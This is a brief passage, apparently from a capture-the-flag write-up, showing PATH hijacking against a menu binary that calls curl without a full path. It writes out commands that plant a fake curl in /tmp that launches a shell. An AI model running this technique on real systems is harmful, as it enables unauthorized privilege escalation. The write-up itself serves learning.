    Running/usr/bin/menu shows us the binary is running without a full path:

    1. status check
2. kernel version
3. ifconfig

    We can exploit this by replacing commands e.g. sh instead of curl and then update the $PATH variable:

    cd /tmp
echo /bin/sh > curl
chmod 777 curl
